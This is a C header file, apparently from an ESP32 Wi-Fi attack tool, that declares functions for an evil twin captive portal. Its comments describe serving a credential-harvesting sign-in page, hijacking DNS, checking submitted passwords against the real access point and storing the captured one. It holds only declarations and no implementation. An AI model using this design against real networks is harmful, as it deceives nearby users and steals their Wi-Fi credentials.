/**
 * @file webserver.h
 * @brief Captive portal for the evil twin attack: HTTP server serving a
 * credential-harvesting sign-in page, plus a DNS hijack so client OSes pop
 * the portal automatically.
 *
 * Submitted passwords are verified live against the real target AP (via
 * wifictl_sta_connect_to_ap) before being accepted - a wrong guess re-serves
 * the form with an error, mirroring how most phishing captive portals work.
 */
#ifndef WEBSERVER_H
#define WEBSERVER_H

#include <stdbool.h>
#include "esp_wifi_types.h"

/**
 * @brief Starts the captive portal HTTP server and DNS hijack.
 *
 * @param target_ap_record the real AP being cloned; used to brand the portal
 * page and to verify submitted passwords against
 */
void webserver_start(const wifi_ap_record_t *target_ap_record);

/**
 * @brief Stops the HTTP server and DNS hijack.
 */
void webserver_stop();

/**
 * @brief Returns the last password verified as correct against the real AP,
 * or NULL if none has been captured yet.
 */
const char *webserver_get_captured_password();

#endif
